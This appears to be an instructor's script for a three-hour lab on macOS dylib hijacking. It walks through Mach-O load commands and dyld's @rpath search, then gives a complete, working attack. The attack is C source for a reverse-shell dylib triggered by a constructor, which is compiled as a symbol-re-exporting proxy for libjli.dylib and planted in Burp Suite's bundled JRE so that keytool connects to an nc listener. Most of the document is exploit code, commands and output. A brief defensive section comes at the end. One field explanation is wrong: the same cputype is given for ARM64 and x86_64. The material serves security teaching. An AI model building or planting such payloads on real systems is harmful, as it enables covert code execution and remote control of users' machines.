# Real-World macOS Dylib Hijacking: Complete Teaching Script

**Class Structure**: 3 Hours | Script + Lab Combined
**Target Application**: Burp Suite Community Edition (`keytool`)
**Learning Outcome**: Students will understand Mach-O structure, dyld loading logic, and execute a real RPATH hijacking attack from scratch.

---

# Introduction (10 minutes)

**Say to Class**:
"Welcome to Real-World Dylib Hijacking. Today we're not just learning theory - we're exploiting a signed, commercial application used by security professionals worldwide. By the end of this class, you'll have a reverse shell in Burp Suite."

"Here's our roadmap:
1. **Foundation** (30 min): Mach-O file structure and dyld theory
2. **Weaponization** (30 min): Building a reverse shell dylib  
3. **Reconnaissance** (45 min): Finding vulnerabilities in Burp Suite
4. **Exploitation** (60 min): Proxying symbols to get our shell
5. **Verification** (15 min): Catching the shell and cleanup"

---

# Part 1: Foundation - Mach-O and Load Commands (30 minutes)

**Say to Class**:
"Before we can hijack libraries, we need to understand the file format. macOS uses **Mach-O** (Mach Object). Think of it as the macOS equivalent of Linux ELF or Windows PE."

## 1.1 The Mach-O Structure

**Say**:
"Every Mach-O file has three parts: Header, Load Commands, and Data. Let's look at a real file."

**Type on screen**:
```bash
# Let's examine a simple binary
cd ~/osmr/socam/labs
gcc hello.c -o hello
otool -h hello
```

**Expected Output**:
```
hello:
Mach header
      magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
 0xfeedfacf 16777223          3  0x00           2    16       1296 0x00200085
```

**Explain each field**:
```bash
# Let's break this down line by line
```

**Say**:
"- `magic`: `0xfeedfacf` = Mach-O 64-bit  
- `cputype`: `16777223` = ARM64 (x86_64 would be `16777223`)
- `filetype`: `2` = MH_EXECUTE (executable binary)
- `ncmds`: `16` = Number of load commands
- `sizeofcmds`: `1296` bytes = Total size of the load commands section"

**Say**:
"The magic number is how the kernel knows this is a valid Mach-O file. The `ncmds` field tells us there are 16 load commands. These are the instructions that tell dyld HOW to load this binary."

---

## 1.2 Understanding Load Commands

**Say**:
"Load Commands are the instruction manual for dyld. They say things like 'map this segment to this memory address' or 'load this external library'. Let's see them."

**Type**:
```bash
otool -l hello | head -30
```

**Expected Output** (partial):
```
Load command 0
      cmd LC_SEGMENT_64
  cmdsize 72
  segname __PAGEZERO
   vmaddr 0x0000000000000000
   vmsize 0x0000000100000000
```

**Explain**:
```bash
# This is command 0 out of 16
# cmd: LC_SEGMENT_64 means "map a 64-bit segment"  
# segname: __PAGEZERO is a special segment
# vmaddr: Virtual memory address (where in RAM)
# vmsize: Size of the segment
```

**Say**:
"The `__PAGEZERO` segment is a security feature. It maps the first 4GB of virtual memory as inaccessible. This prevents NULL pointer dereference exploits."

---

## 1.3 Critical Load Commands for Hijacking

**Say**:
"For our attack, we care about THREE load command types. Let me show you each one."

### LC_ID_DYLIB (The Library's Identity)

**Say**:
"When you compile a dylib, it embeds its own name inside itself. This is called the Install Name."

**Type**:
```bash
# Let's look at a system library
otool -D /usr/lib/libSystem.B.dylib
```

**Expected Output**:
```
/usr/lib/libSystem.B.dylib:
/usr/lib/libSystem.B.dylib
```

**Say**:
"See that? The file `/usr/lib/libSystem.B.dylib` says 'My name is /usr/lib/libSystem.B.dylib'. When you link against this library, the linker COPIES this path into your binary."

**Demonstrate**:
```bash
# Let's prove it
otool -L hello
```

**Expected Output**:
```
hello:
    /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1336.61.1)
```

**Say**:
"Your `hello` binary doesn't say 'I need libSystem'. It says 'I need the library at /usr/lib/libSystem.B.dylib'. That path came from inside the dylib's `LC_ID_DYLIB` command."

---

### LC_LOAD_DYLIB vs LC_LOAD_WEAK_DYLIB

**Say**:
"When a binary needs a library, it uses one of two commands: `LC_LOAD_DYLIB` (hard dependency) or `LC_LOAD_WEAK_DYLIB` (optional dependency)."

**Type**:
```bash
# Let's see the difference
otool -l hello | grep -A 3 "LC_LOAD"
```

**Explain the output**:
```bash
# LC_LOAD_DYLIB: If dyld can't find this, the app CRASHES
# LC_LOAD_WEAK_DYLIB: If dyld can't find this, the app CONTINUES
```

**Say**:
"Why would you make a library optional? Backward compatibility. Imagine an app that uses a new macOS 14 feature. On macOS 14, the library exists. On macOS 13, it doesn't. With weak linking, the app runs on both - it just checks if the library loaded before using it."

**Say**:
"For attackers, weak dylibs are GOLD. If the library is missing, we can provide it. The app will happily load our malicious version."

---

### LC_RPATH (The Search Path)

**Say**:
"This is the vulnerability we'll exploit. `LC_RPATH` defines WHERE dyld looks for libraries. Modern apps use `@rpath` as a variable in library paths."

**Type**:
```bash
# Let's examine Burp Suite
otool -l "/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/keytool" | grep RPATH -A 2
```

**Expected Output**:
```
          cmd LC_RPATH
      cmdsize 32
         path @loader_path/. (offset 12)
--
          cmd LC_RPATH
      cmdsize 40
         path @loader_path/../lib (offset 12)
```

**Draw on whiteboard / explain**:
```
dyld's Search Algorithm for @rpath/libjli.dylib:

1. Check RPATH #1: @loader_path/.  
   → Substitute: .../bin/
   → Full path: .../bin/libjli.dylib
   → File exists? NO → Keep searching

2. Check RPATH #2: @loader_path/../lib
   → Substitute: .../lib/
   → Full path: .../lib/libjli.dylib  
   → File exists? YES → LOAD IT
```

**Say**:
"The vulnerability: If we place OUR dylib at `.../bin/libjli.dylib`, dyld stops at step 1 and loads OURS. It never reaches step 2 where the real library lives."

---

## 1.4 The @rpath Variables

**Say**:
"There are three magic variables you need to know. Let me explain each with examples."

**Write on board**:
```
@executable_path = Directory of the MAIN binary (the one you double-clicked)
@loader_path = Directory of the binary LOADING this library
@rpath = Placeholder (replaced by LC_RPATH entries)
```

**Example Scenario**:
```bash
# Application structure:
# /Applications/MyApp.app/Contents/MacOS/MyApp (main binary)
# /Applications/MyApp.app/Contents/Frameworks/Helper.framework/Helper (dylib)

# If MyApp has: LC_RPATH = @executable_path/../Frameworks
# And it loads: @rpath/Helper.framework/Helper

# dyld resolves:
# @executable_path = /Applications/MyApp.app/Contents/MacOS
# @executable_path/../Frameworks = /Applications/MyApp.app/Contents/Frameworks  
# Final path: /Applications/MyApp.app/Contents/Frameworks/Helper.framework/Helper
```

**Say**:
"The difference between `@executable_path` and `@loader_path` matters when libraries load other libraries. `@executable_path` is always the main app. `@loader_path` changes based on WHO is doing the loading."

---

# Part 2: Weapon Development - The Reverse Shell Dylib (30 minutes)

**Say to Class**:
"Now that you understand the theory, let's build our weapon. We need code that runs automatically when the dylib loads."

## 2.1 The Constructor Attribute

**Say**:
"In C, we have a special GCC/Clang attribute: `__attribute__((constructor))`. When you mark a function with this, the compiler does something special."

**Type on screen**:
```bash
cat > payload.c <<'EOF'
#include <stdio.h>

__attribute__((constructor))
void my_init() {
    printf("[+] Dylib loaded!\n");
}
EOF
```

**Compile and inspect**:
```bash
gcc -dynamiclib payload.c -o payload.dylib
otool -s __DATA __mod_init_func payload.dylib
```

**Expected Output**:
```
Contents of (__DATA,__mod_init_func) section
0000000000004000    40 3f 00 00 00 00 00 00
```

**Explain**:
```bash
# Those hex bytes? That's the address of my_init()
# dyld looks for the __mod_init_func section
# It calls every function pointer it finds there
# This happens BEFORE main()
```

---

## 2.2 Building the Reverse Shell

**Say**:
"A 'Hello World' payload is cute, but let's get serious. We need a TCP reverse shell. I'll explain every single line."

**Type**:
```bash
cat > payload.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

__attribute__((constructor))
void reverse_shell() {
    int sockfd;
    struct sockaddr_in serv_addr;

    // CONFIGURATION
    char *ip = "127.0.0.1";
    int port = 4444;

    printf("[*] Dylib Loaded. Connecting to %s:%d...\n", ip, port);

    // Create TCP socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    // Configure server address
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &serv_addr.sin_addr);

    // Connect and redirect I/O
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
        dup2(sockfd, 0); // Stdin
        dup2(sockfd, 1); // Stdout  
        dup2(sockfd, 2); // Stderr
        execl("/bin/zsh", "zsh", NULL);
    } else {
        printf("[-] Connection failed\n");
    }
}
EOF
```

**Now explain line by line**:

```bash
# int sockfd;
```
**Say**: "This is our file descriptor. In UNIX, network connections are files. `sockfd` is our 'handle' to that connection."

```bash
# struct sockaddr_in serv_addr;
```
**Say**: "This structure holds the IP address and port of our listener. It's defined in `netinet/in.h`."

```bash
# sockfd = socket(AF_INET, SOCK_STREAM, 0);
```
**Say**: "Creates a TCP socket. `AF_INET` = IPv4. `SOCK_STREAM` = TCP (reliable, ordered). The `0` means 'default protocol' which is TCP for stream sockets."

```bash
# serv_addr.sin_family = AF_INET;
```
**Say**: "Must match the socket type."

```bash
# serv_addr.sin_port = htons(port);
```
**Say**: "**H**ost **to** **N**etwork **S**hort. Network protocols use big-endian byte order. Intel CPUs use little-endian. We need to convert."

```bash
# inet_pton(AF_INET, ip, &serv_addr.sin_addr);
```
**Say**: "**Inet** **P**resentation **to** **N**umeric. Converts the string '127.0.0.1' into a 32-bit binary IP address."

```bash
# connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr))
```
**Say**: "Initiates the TCP handshake (SYN, SYN-ACK, ACK). Returns `0` on success, `-1` on failure."

```bash
# dup2(sockfd, 0);  
# dup2(sockfd, 1);  
# dup2(sockfd, 2);
```
**Say**: "THIS is the magic. `dup2()` duplicates file descriptors.  
- `dup2(sockfd, 0)`: Closes stdin (FD 0) and replaces it with the socket. Now reading from stdin reads from the network.
- `dup2(sockfd, 1)`: Same for stdout. Output goes to the socket.
- `dup2(sockfd, 2)`: Same for stderr."

```bash
# execl("/bin/zsh", "zsh", NULL);
```
**Say**: "Replaces our process with a new program (Zsh shell). The shell's stdin/stdout/stderr are connected to the socket. The attacker types commands over the network, gets output back. That's a reverse shell."

---

## 2.3 Compilation and Testing

**Say**:
"Let's compile and test this standalone before using it in the attack."

**Type**:
```bash
gcc -dynamiclib payload.c -o payload.dylib
file payload.dylib
```

**Expected Output**:
```
payload.dylib: Mach-O 64-bit dynamically linked shared library arm64
```

**Verify the constructor**:
```bash
otool -s __DATA __mod_init_func payload.dylib
```

**Say**:
"If you see hex output, the constructor is registered. Now let's test it."

**Terminal 1 (Listener)**:
```bash
nc -lvp 4444
```

**Terminal 2 (Injection)**:
```bash
# Create a test target
echo 'int main() { sleep(10); }' > test.c
gcc test.c -o test

# Inject our payload
DYLD_INSERT_LIBRARIES=./payload.dylib ./test
```

**Expected Result**:
```bash
# Terminal 2 shows:
[*] Dylib Loaded. Connecting to 127.0.0.1:4444...

# Terminal 1 shows:
Connection received from 127.0.0.1 39482
zsh-5.9$
```

**Type `whoami` in Terminal 1**:
```bash
whoami
```

**Say**:
"If you see your username, congratulations - the payload works! Now let's use it against a real target."

---

# Part 3: The Hunt - Finding Real Vulnerabilities (45 minutes)

**Say to Class**:
"Environment variable injection (`DYLD_INSERT_LIBRARIES`) is blocked by Hardened Runtime. We need to find an application with a vulnerable library loading configuration. Today's target: Burp Suite."

## 3.1 Why Burp Suite?

**Say**:
"Burp Suite is a Java application. It bundles its own Java Runtime Environment (JRE). That means custom library paths - a breeding ground for misconfigurations."

**Draw architecture on board**:
```
Burp Suite.app/
├── Contents/
    ├── MacOS/
    │   └── BurpSuiteCommunity (signed, hardened)
    └── Resources/
        └── jre.bundle/  
            └── Contents/
                └── Home/
                    ├── bin/
                    │   ├── keytool (our target!)
                    │   └── rmiregistry
                    └── lib/
                        └── libjli.dylib (the real library)
```

**Say**:
"We're not attacking the main `BurpSuiteCommunity` binary - that's locked down. We're attacking `keytool`, a utility buried in the JRE. Utilities are often overlooked during security hardening."

---

## 3.2 Static Analysis - Finding the Vulnerability

**Say**:
"Let's investigate `keytool` to find out what libraries it needs and WHERE it looks for them."

**Type**:
```bash
# Set up our target path
TARGET="/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/keytool"

# Check what libraries it needs
otool -L "$TARGET"
```

**Expected Output**:
```
keytool:
    @rpath/libjli.dylib (compatibility version 1.0.0, current version 1.0.0)
    /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1336.61.1)
```

**Highlight the key line**:
```bash
# ← THIS LINE IS THE VULNERABILITY
@rpath/libjli.dylib
```

**Say**:
"See `@rpath`? That's a variable. We need to find out what paths dyld will search. That's defined by `LC_RPATH` commands."

**Type**:
```bash
otool -l "$TARGET" | grep RPATH -A 2
```

**Expected Output**:
```
          cmd LC_RPATH
      cmdsize 32
         path @loader_path/. (offset 12)
--
          cmd LC_RPATH
      cmdsize 40
         path @loader_path/../lib (offset 12)
```

**Write out the resolution on board**:
```
Given: keytool needs @rpath/libjli.dylib
keytool is located at: .../Home/bin/keytool

RPATH Resolution:
1. RPATH #1: @loader_path/.
   @loader_path = .../Home/bin/
   Full path: .../Home/bin/libjli.dylib
   → File exists here? Let's check...

2. RPATH #2: @loader_path/../lib  
   @loader_path = .../Home/bin/
   .. = go up one level = .../Home/
   Full path: .../Home/lib/libjli.dylib
   → This is where the REAL library lives
```

**Verify**:
```bash
# Check if file exists in bin/
ls "/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib"
```

**Expected Output**:
```
ls: .../bin/libjli.dylib: No such file or directory
```

**Say**:
"BINGO! The file doesn't exist in `bin/`. dyld will skip to the next RPATH and find the real library in `lib/`. BUT - if we create a file at `.../bin/libjli.dylib`, dyld will find OURS first and stop searching."

---

## 3.3 Understanding the Attack Vector

**Say**:
"Let me show you the dyld search algorithm in code. This is from the actual dyld source."

**Show pseudocode on screen**:
```c
// dyld's search algorithm (simplified)
void load_library(const char* library_path) {
    // Example: library_path = "@rpath/libjli.dylib"
    
    if (starts_with(library_path, "@rpath/")) {
        // Get the library name
        const char* lib_name = library_path + 7; // Skip "@rpath/"
        
        // Loop through all LC_RPATH entries
        for (each rpath in LC_RPATH_commands) {
            // Resolve variables
            char* resolved_rpath = resolve_variables(rpath);
            
            // Build full path  
            char* full_path = concat(resolved_rpath, lib_name);
            
            // Check if file exists
            if (file_exists(full_path)) {
                load_dylib(full_path);
                return; // STOP SEARCHING!
            }
        }
        
        // If we get here, library not found
        if (is_weak_dylib) {
            continue_execution();
        } else {
            crash("Library not loaded");
        }
    }
}
```

**Say**:
"The critical part is that `if (file_exists(full_path))` check. As soon as dyld finds a file, it loads it and STOPS. It doesn't verify signatures, check permissions, or validate the file. It trusts the path."

---

# Part 4: Exploitation - The Proxy Attack (60 minutes)

**Say to Class**:
"We found the vulnerability. We have our payload. But we can't just drop our `payload.dylib` as `libjli.dylib`. The application NEEDS specific functions from that library. If they're missing, it crashes."

## 4.1 Demonstrating the Problem

**Say**:
"Let me show you what happens if we naively replace the library."

**Type** (DON'T actually execute this):
```bash
# THIS WILL CRASH - Don't run!
cp payload.dylib "/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib"
"$TARGET"
```

**Show simulated error**:
```
dyld[12345]: Symbol not found: _JLI_Launch
  Referenced from: <...>/keytool
  Expected in: <...>/bin/libjli.dylib
Abort trap: 6
```

**Say**:
"The `keytool` binary calls a function called `JLI_Launch()`. It's defined in the real `libjli.dylib`. Our payload doesn't have that function. dyld says 'Symbol not found' and crashes the app."

**Check what symbols the real library exports**:
```bash
REAL_LIB="/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib"
nm -gU "$REAL_LIB" | head -10
```

**Expected Output**:
```
0000000000003f00 T _JLI_GetStdArgs
0000000000004100 T _JLI_Launch
0000000000004200 T _JLI_ManifestIterate
...
```

**Say**:
"`T` means 'Text section' (code). These are exported functions. `keytool` expects ALL of these to exist. We must provide them."

---

## 4.2 The Solution: Symbol Re-Exporting

**Say**:
"We need to create a proxy. Our dylib has TWO jobs:  
1. Run our malicious constructor (the reverse shell)
2. Forward ALL symbol lookups to the real library

This is called **re-exporting**."

**Draw diagram on board**:
```
keytool calls JLI_Launch()
         ↓
    [Our Proxy: bin/libjli.dylib]
    ├─ Has: reverse_shell() constructor ✓
    └─ Forwards symbols to: lib/libjli.dylib
              ↓
    [Real libjli: lib/libjli.dylib]
    └─ Returns: JLI_Launch() function pointer
         ↓
keytool executes JLI_Launch() successfully
```

---

## 4.3 Compiling the Proxy

**Say**:
"The linker has a flag for this: `-Wl,-reexport_library`. But we also need to reserve space in the header for path modifications with `-headerpad_max_install_names`."

**Type**:
```bash
# Define the real library path
REAL_LIB="/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib"

# Compile our payload WITH re-export AND header padding
gcc -dynamiclib payload.c \
-Wl,-reexport_library,"$REAL_LIB" \
-Wl,-headerpad_max_install_names \
-o libjli.dylib
```

**Explain each flag**:
```bash
# gcc: The compiler
# -dynamiclib: Build a dylib (not an executable)
# payload.c: Our reverse shell source
# -Wl,-reexport_library,"$REAL_LIB":
#     -Wl = Pass the following to the LINKER (not compiler)
#     -reexport_library = Create a re-export relationship
#     "$REAL_LIB" = The library to re-export
# -Wl,-headerpad_max_install_names:
#     Reserves extra space in the Mach-O header
#     This allows install_name_tool to replace short paths with long paths
#     Without this, you'll get "larger updated load commands do not fit" error
# -o libjli.dylib: Output file (MUST match the name keytool expects)
```

**Say**:
"Why do we need `-headerpad_max_install_names`? The Mach-O header has a fixed size. When we compile with `@rpath/libjli.dylib`, that's only 20 characters. But the absolute path is over 100 characters. If we don't reserve extra space during compilation, `install_name_tool` can't make the string longer later."

**Show the math**:
```bash
# Short path (what the linker initially creates):
echo -n "@rpath/libjli.dylib" | wc -c
# Output: 20

# Long path (what we need to change it to):  
echo -n "$REAL_LIB" | wc -c
# Output: 112

# Without headerpad: Can't fit 112 chars where only 20 were allocated
# With headerpad: Linker reserves ~1024 bytes for path strings
```

**Check what we created**:
```bash
otool -L libjli.dylib
```

**Expected Output**:
```
libjli.dylib:
    @rpath/libjli.dylib (compatibility version 1.0.0, current version 1.0.0)
    /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1336.61.1)
```

**Point out the problem we'll fix next**:
```bash
# ← We'll fix this in the next step
@rpath/libjli.dylib
```

**Say**:
"See that `@rpath/libjli.dylib`? Our proxy says it re-exports `@rpath/libjli.dylib`. But WE are `libjli.dylib`, and we're in an `@rpath` location. dyld might try to load us as our own dependency - an infinite loop! Now that we have the header padding, we can safely change this path."

---

## 4.4 Fixing the Infinite Loop

**Say**:
"We need to change that `@rpath/libjli.dylib` reference to point to the ABSOLUTE PATH of the real library. We use `install_name_tool` for this."

**Type**:
```bash
install_name_tool -change "@rpath/libjli.dylib" "$REAL_LIB" libjli.dylib
```

**Explain**:
```bash
# install_name_tool: Utility for modifying Mach-O load commands
# -change <old> <new>: Replace dependency <old> with <new>
# "@rpath/libjli.dylib": The problematic reference  
# "$REAL_LIB": The absolute path to the real library
# libjli.dylib: The file to modify
```

**Verify the fix**:
```bash
otool -L libjli.dylib
```

**Expected Output**:
```
libjli.dylib:
    /Applications/Burp Suite Community Edition.app/.../lib/libjli.dylib (compatibility version 1.0.0, current version 1.0.0)
    /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1336.61.1)
```

**Say**:
"Perfect! Now it points to the absolute path. No more loops."

---

## 4.5 Deployment

**Say**:
"Moment of truth. We're going to place our weaponized dylib in the vulnerable directory."

**Type**:
```bash
# Define destination
DEST="/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib"

# Deploy
cp libjli.dylib "$DEST"

# Verify
ls -la "$DEST"
```

**Expected Output**:
```
-rw-r--r--  1 youruser  staff  16384 Jan 23 10:00 .../bin/libjli.dylib
```

**Say**:
"It's there. Our trojan is in place. Now let's trigger it."

---

# Part 5: Execution & Verification (15 minutes)

## 5.1 Setting Up the Listener

**Say**:
"Open a new terminal tab. This will catch our reverse shell."

**Terminal 1**:
```bash
nc -lvp 4444
```

**Expected Output**:
```
Listening on 0.0.0.0 4444
```

**Say**:
"This starts a TCP listener on port 4444. When our payload connects, we'll get a shell."

---

## 5.2 Triggering the Exploit

**Say**:
"Now we run `keytool`. It will load our malicious dylib, which will run the constructor, which will connect back to us."

**Terminal 2**:
```bash
"/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/keytool"
```

**Expected - Terminal 2**:
```
[*] Dylib Loaded. Connecting to 127.0.0.1:4444...
Key and Certificate Management Tool
...
```

**Expected - Terminal 1**:
```
Connection received from 127.0.0.1 49572
zsh-5.9$
```

---

## 5.3 Verifying Access

**Say**:
"Let's verify we have shell access. Type these commands in Terminal 1 (the listener)."

**In the shell**:
```bash
whoami
```

**Expected Output**:
```
youruser
```

**Try more commands**:
```bash
pwd
ls
ps aux | grep keytool
```

**Say**:
"Notice: `keytool` is still running normally in Terminal 2. The help menu displayed. The application didn't crash. That's because our proxy successfully forwarded all the symbols to the real library."

---

## 5.4 Cleanup

**Say**:
"Always clean up after a demonstration. Remove the malicious dylib."

**Type**:
```bash
DEST="/Applications/Burp Suite Community Edition.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib"
rm "$DEST"
```

**Verify**:
```bash
ls "$DEST"
```

**Expected**:
```
ls: .../bin/libjli.dylib: No such file or directory
```

---

# Conclusion (10 minutes)

**Say to Class**:
"Let's review what we accomplished today."

**Summarize on board**:
```
✓ Understood Mach-O structure (Header, Load Commands, Data)
✓ Learned critical load commands (LC_ID_DYLIB, LC_LOAD_DYLIB, LC_RPATH)  
✓ Built a weaponized dylib (reverse shell with constructor)
✓ Found a real vulnerability (Burp Suite RPATH misconfiguration)
✓ Exploited it with symbol proxying (-reexport_library)
✓ Got a shell in a signed, hardened application
```

**Key Takeaways**:
"1. **dyld trusts paths**: If you control a path in an RPATH, you control code execution.
2. **Proxying is essential**: Real attacks need symbol forwarding to avoid crashes.
3. **This is everywhere**: Java apps, Electron apps, bundled frameworks - they all use custom library paths."

**Defensive Recommendations**:
```bash
# For developers:
1. Use absolute paths (not @rpath) whenever possible
2. Never put . (current directory) in LC_RPATH
3. Sign and verify all bundled libraries
4. Enable Hardened Runtime for ALL binaries (not just the main one)

# For defenders:
1. Monitor /Applications for unexpected dylibs
2. Use fs_usage to watch dyld behavior
3. Check code signatures recursively (codesign --verify -vv -R)
```

**Final Words**:
"You now have the skills to find and exploit dylib hijacking vulnerabilities. Use this knowledge responsibly. Questions?"

---

# Appendix: Troubleshooting

## Problem: install_name_tool Says "Larger Updated Load Commands Do Not Fit"

**Error**:
```
install_name_tool: changing install names or rpaths can't be redone for: libjli.dylib (for architecture arm64) because larger updated load commands do not fit (the program must be relinked, and you may need to use -headerpad or -headerpad_max_install_names)
```

**Cause**:
The Mach-O header doesn't have enough padding to accommodate the longer absolute path string.

**Visual Explanation**:
```
Original compilation (without headerpad):
+------------------+
| Mach-O Header    |  ← Fixed size, tight fit
| "@rpath/lib.dylib" (20 chars)
+------------------+
| Load Commands    |
| ...              |

Trying to change to absolute path:
+------------------+
| Mach-O Header    |  ← Not enough space!
| "/Applications/Burp...lib.dylib" (112 chars) ← Won't fit!
+------------------+

With -headerpad_max_install_names:
+------------------+
| Mach-O Header    |  ← Extra padding reserved
| "@rpath/lib.dylib" (20 chars)
| [Reserved space - 1004 bytes unused]
+------------------+
| Load Commands    |

Now we can safely modify:
+------------------+
| Mach-O Header    |  ← Fits perfectly!
| "/Applications/Burp...lib.dylib" (112 chars)
| [Remaining padding]
+------------------+
```

**Solution**:
Re-compile with the `-headerpad_max_install_names` flag:

```bash
gcc -dynamiclib payload.c \
-Wl,-reexport_library,"$REAL_LIB" \
-Wl,-headerpad_max_install_names \
-o libjli.dylib
```

**Why This Works**:
The `-headerpad_max_install_names` flag tells the linker to reserve approximately 1024 bytes of padding in the Mach-O header specifically for path strings. This gives `install_name_tool` room to replace short paths with longer ones.

**Verify the padding**:
```bash
# Check header size before
gcc -dynamiclib payload.c -Wl,-reexport_library,"$REAL_LIB" -o test1.dylib
otool -l test1.dylib | grep -A 5 "cmd LC_DYLIB_CODE_SIGN_DRS" | grep cmdsize

# Check header size after (larger)
gcc -dynamiclib payload.c -Wl,-reexport_library,"$REAL_LIB" -Wl,-headerpad_max_install_names -o test2.dylib
otool -l test2.dylib | grep -A 5 "cmd LC_DYLIB_CODE_SIGN_DRS" | grep cmdsize
```

---

## Problem: Application Still Crashes

**Error**:
```
dyld: Symbol not found: _SomeSymbol
```

**Debug**:
```bash
# Check if install_name_tool worked
otool -L libjli.dylib

# Ensure the real library path is correct
ls -la "$REAL_LIB"

# Check exported symbols from real library  
nm -gU "$REAL_LIB" | grep SomeSymbol
```

---

## Problem: No Shell Connection

**Possible Causes**:
1. Firewall blocking port 4444
2. Wrong IP/port in payload.c
3. Listener not running

**Debug Steps**:
```bash
# Check firewall
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate

# Verify listener
lsof -i :4444

# Add debug output to payload
printf("[DEBUG] Socket creation: %d\n", sockfd);
printf("[DEBUG] Connect result: %d\n", result);
```

---

# Additional Resources

**Source Code References**:
- dyld source: https://opensource.apple.com/source/dyld/
- Especially: `dyld/ImageLoader.cpp` (search for `recursiveLoadLibraries`)

**Tools**:
- `otool`: macOS built-in Mach-O inspector
- `install_name_tool`: Modify dylib references  
- `nm`: Symbol table viewer
- `fs_usage`: Real-time filesystem monitoring
- `class-dump`: Extract Objective-C headers from binaries

**Further Reading**:
- "Mac OS X Internals" by Amit Singh
- "The Mac Hacker's Handbook" by Miller et al.
- dyld man page: `man dyld`
